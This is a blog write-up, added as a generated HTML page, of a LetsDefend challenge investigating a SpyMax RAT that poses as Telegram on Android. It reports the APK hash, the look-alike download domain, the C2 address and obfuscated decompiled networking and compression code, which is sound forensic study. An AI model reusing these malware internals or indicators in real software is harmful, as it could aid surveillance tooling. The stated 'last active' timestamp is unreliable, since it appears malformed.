@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.d451ff92e80abc2a828eb9bb262e4db374bd4e954642f9245c54eec84bf690f3.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Ahmed Mani - Spymax Telegram Rat LetsDefend Writeup</title>
+<meta property="og:title" content=Ahmed&#32;Mani&#32;-&#32;Spymax&#32;Telegram&#32;Rat&#32;LetsDefend&#32;Writeup />
+<meta name="twitter:title" content=Ahmed&#32;Mani&#32;-&#32;Spymax&#32;Telegram&#32;Rat&#32;LetsDefend&#32;Writeup />
+<meta itemprop="name" content=Ahmed&#32;Mani&#32;-&#32;Spymax&#32;Telegram&#32;Rat&#32;LetsDefend&#32;Writeup />
+<meta name="application-name" content=Ahmed&#32;Mani&#32;-&#32;Spymax&#32;Telegram&#32;Rat&#32;LetsDefend&#32;Writeup />
+<meta property="og:site_name" content="Mani Blue" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="http://localhost:1313/posts/spymax-telegram-rat/" />
+<link rel="canonical" href="http://localhost:1313/posts/spymax-telegram-rat/" itemprop="url" />
+<meta name="url" content="http://localhost:1313/posts/spymax-telegram-rat/" />
+<meta name="twitter:url" content="http://localhost:1313/posts/spymax-telegram-rat/" />
+<meta property="og:url" content="http://localhost:1313/posts/spymax-telegram-rat/" />
+
+
+<meta property="og:updated_time" content="2026-01-23T02:22:11&#43;01:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="Mani Blue" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.156.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.49603abe3b120fd297c842ac269b38cc04019325df8e0684cbd8acdf14e201e7.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="http://localhost:1313/">
+                <img src="https://poison.lukeorth.com/images/brand_image.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="http://localhost:1313/">
+                <h1>Ahmed Mani</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Hey my name is Ahmed i write about blueteam exercises and anything i find interesting.
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About Me</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/ahmedmani">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ahmed-mani-b7202a216/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Telegram" href="https://t.me/ahmedmani10">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19c-.14.75-.42 1-.68 1.03c-.58.05-1.02-.38-1.58-.75c-.88-.58-1.38-.94-2.23-1.5c-.99-.65-.35-1.01.22-1.59c.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02c-.09.02-1.49.95-4.22 2.79c-.4.27-.76.41-1.08.4c-.36-.01-1.04-.2-1.55-.37c-.63-.2-1.12-.31-1.08-.66c.02-.18.27-.36.74-.55c2.92-1.27 4.86-2.11 5.83-2.51c2.78-1.16 3.35-1.36 3.73-1.36c.08 0 .27.02.39.12c.1.08.13.19.14.27c-.01.06.01.24 0 .38z"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://ahmedmani@hotmail.com">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+
+
+        <p class="footnote">
+    &copy; 2026 Mani Blue. All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/spymax-telegram-rat/">Spymax Telegram Rat LetsDefend Writeup</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2026-01-23T02:22:11&#43;0100" class="post-date">
+        January 23, 2026
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>5 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p>This write‑up documents how I approached and solved the <strong>SpyMax Telegram RAT</strong> challenge on LetsDefend.</p>
+<p>The scenario involves a victim who attempted to download the Telegram app on their Android device. Instead of using the official Google Play Store, the victim accessed a suspicious website advertising a “faster” download. The victim installed a malicious APK disguised as Telegram, resulting in a potential device compromise. The objective of this investigation was to analyze the APK and uncover key details about the attack.</p>
+<p>In short, a user downloaded a malicious APK masquerading as a legitimate application. With that context, let’s dive into the analysis.</p>
+<h1 id="initial-evidence"><strong>Initial Evidence</strong></h1>
+<p>We are provided with an AD1 image, which stands for AccessData Logical Image. This is a forensic image format generated by tools such as FTK Imager and is commonly used in digital forensics.</p>
+<blockquote>
+<p><em><strong>What is the SHA-1 hash of the malicious APK file?</strong></em></p>
+</blockquote>
+<p>Press enter or click to view image in full size</p>
+<p><img src="/images/str-sc1.png" alt="Alt text"></p>
+<p>By opening the AD1 image in FTK Imager and navigating to the Downloads directory, the malicious APK can be identified. After exporting the APK and calculating its hash using a simple PowerShell command, the SHA‑1 hash is: <em><strong>a192df3e1ee4f74d4078180a465ebc157bbd886b</strong></em></p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="/images/str-sc2.png" alt="Alt text"></p>
+<blockquote>
+<p><em><strong>What type of attack did the victim fall for?</strong></em></p>
+</blockquote>
+<p>The victim was tricked into downloading a malicious APK by impersonating a trusted app. Impersonation is a key signature for <em><strong>Phishing</strong></em> attacks.</p>
+<blockquote>
+<p><em><strong>What is the malicious domain associated with this attack?</strong></em></p>
+</blockquote>
+<p>This question refers to the domain from which the malicious APK was downloaded. On android devices the file</p>
+<blockquote>
+<p><em><strong>/data/data/com.android.providers.downloads/databases/downloads.db</strong></em></p>
+</blockquote>
+<p>is an SQLite database that stores metadata about downloaded files.</p>
+<p>I exported this database using FTK Imager and opened it with DB Browser for SQLite. Among the various tables, the <strong>downloads</strong> table contains a <code>uri</code> column, which records the download source. The malicious domain identified in this column is: <em><strong>piay.google.com</strong></em></p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="/images/str-sc3.png" alt="Alt text"></p>
+<blockquote>
+<p><em>What is the IP address and port of the Command and Control (C2) server used by the malicious app?</em></p>
+</blockquote>
+<p>To answer this question, the APK had to be reverse engineered. I used JADX GUI to decompile and inspect the application.</p>
+<p>Given the nature of SpyMax, I assumed the malware would communicate with its C2 server either via HTTP or raw sockets. Searching for HTTP-related artifacts did not yield results, but searching for socket-related code did.</p>
+<p>Although the code is heavily obfuscated, a key method call stood out:</p>
+<pre tabindex="0"><code>vhnvitlsjqhpnpdnttkkdpfhpbikoymknsrbkhwtaggb4244.ad = InetAddress.getByName(split[i]
+</code></pre><p>This method resolves a hostname to an IP address.</p>
+<p>Further analysis showed that the hostname and port were being parsed from values loaded at runtime. Tracing the variable assignments revealed that these values originate from the <code>strings.xml</code> resource file.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="/images/str-sc4.png" alt="Alt text"></p>
+<p>Inspecting <code>strings.xml</code> revealed the C2 server information: <em><strong>192.168.245.130:7771</strong></em></p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="/images/str-sc5.png" alt="Alt text"></p>
+<blockquote>
+<p><em>What is the name of the function responsible for compressing data in the malicious APK?</em></p>
+</blockquote>
+<p>The malware compresses data before transmitting it to the C2 server, most likely to reduce network size and evade detection.</p>
+<p>While inspecting socket <code>OutputStream</code> writes, I identified the following code:</p>
+<pre tabindex="0"><code>try {
+  synchronized (vhnvitlsjqhpnpdnttkkdpfhpbikoymknsrbkhwtaggb4244.y) {
+    byte[] f = agnaxqpowggbffhkaekewcuxcclwqkwjdjouvkriwwqmkafbpjzcvxcxlpxuetxmjxxwqnpqnchzmincxkhhkunfgrifmwdc4245.f(str, bArr);
+    vhnvitlsjqhpnpdnttkkdpfhpbikoymknsrbkhwtaggb4244.k.setSendBufferSize(f.length);
+    vhnvitlsjqhpnpdnttkkdpfhpbikoymknsrbkhwtaggb4244.out.write(f, 0, f.length);
+  }
+} catch (Exception unused) {
+  vhnvitlsjqhpnpdnttkkdpfhpbikoymknsrbkhwtaggb4244.di();
+}
+</code></pre><p>the <strong>vhnv…ggb4244.out.write</strong> call is writing data to the output stream, the data being written is the result of calling <strong>ag…mdc4245.f</strong></p>
+<pre tabindex="0"><code>public static byte[] f(String str, byte[] bArr) throws Exception {
+  ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+  byte[] cZp = cZp(str.getBytes());
+  byte[] cZp2 = cZp(bArr);
+  byte[] bytes = String.valueOf(cZp.length).getBytes();
+  byte[] bytes2 = String.valueOf(cZp2.length).getBytes();
+  byteArrayOutputStream.write(bytes, 0, bytes.length);
+  byteArrayOutputStream.write(0);
+  byteArrayOutputStream.write(bytes2, 0, bytes2.length);
+  byteArrayOutputStream.write(0);
+  byteArrayOutputStream.write(cZp, 0, cZp.length);
+  byteArrayOutputStream.write(cZp2, 0, cZp2.length);
+  byte[] byteArray = byteArrayOutputStream.toByteArray();
+  try {
+    byteArrayOutputStream.close();
+  } catch (Exception unused) {
+  }
+  return byteArray;
+}
+</code></pre><p>this method is writing multiple bytes to a <strong>byteArrayOutputStream</strong> object and returning it as a single byte array.</p>
+<p>the <em><strong>cZp</strong></em> method stands out here, inspecting it further its evident its the method doing the compression.</p>
+<pre tabindex="0"><code>public static byte[] cZp(byte[] bArr) throws Exception {
+  ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(bArr.length);
+  GZIPOutputStream gZIPOutputStream = new GZIPOutputStream(byteArrayOutputStream);
+  gZIPOutputStream.write(bArr);
+  gZIPOutputStream.close();
+  byte[] byteArray = byteArrayOutputStream.toByteArray();
+  byteArrayOutputStream.close();
+  return byteArray;
+}
+</code></pre><blockquote>
+<p><em>What phone number did the attacker dial?</em></p>
+</blockquote>
+<p>similar to downloads db, the file</p>
+<blockquote>
+<p><em>/<strong>data/data/com.android.providers.contacts/databases/contacts2.db</strong></em></p>
+</blockquote>
+<p>holds various informations related to Calls, Phone numbers etc.</p>
+<p>After opening this database in DB Browser for SQLite and inspecting the <strong>calls</strong> table, I found a single dialed number: <em><strong>09436521458754</strong></em></p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="/images/str-sc6.png" alt="Alt text"></p>
+<blockquote>
+<p><em>What is the decryption key that was left by the attacker?</em></p>
+</blockquote>
+<p>The SMS database is located at:</p>
+<blockquote>
+<p><em><strong>/data/data/com.android.providers.telephony/databases/mmssms.db</strong></em></p>
+</blockquote>
+<p>Inspecting this database revealed an SMS sent to the same phone number. The message content is:</p>
+<blockquote>
+<p><em>Urer vf gur qrpelcgvba xrl: mPyQd9sr0nlgXssda648Y0ZyAwbmxTCp Nccyl vg vzzrqvngryl gb npprff gur svyrf. Pbasvez bapr vg’f qbar.</em></p>
+</blockquote>
+<p>Which resembeles a lot the result of Caesar shift, Decoding it produces the following message</p>
+<blockquote>
+<p><em>Here is the decryption key: zClDq9fe0aytKffqn648L0MlNjozkGPc Apply it immediately to access the files. Confirm once it’s done.</em></p>
+<p><em>To which location or service does the dialed number belong?</em></p>
+</blockquote>
+<p>Running a simple google search for the country code 94 revealed the number belonged to <em><strong>Sri Lanka.</strong></em></p>
+<blockquote>
+<p><em>When was the last time the malicious APK was active?</em></p>
+</blockquote>
+<p>Inspecting the “/<strong>data/system/usagestats/0/yearly</strong>” xml file and searching using the package name, i found it was last active on <em><strong>17355124949.</strong></em></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+	    
+            <div class="next-post">
+                <a href="http://localhost:1313/posts/wordpress-web-forensics/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Wordpress Web Forensics LetsDefend Writeup</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents"></nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
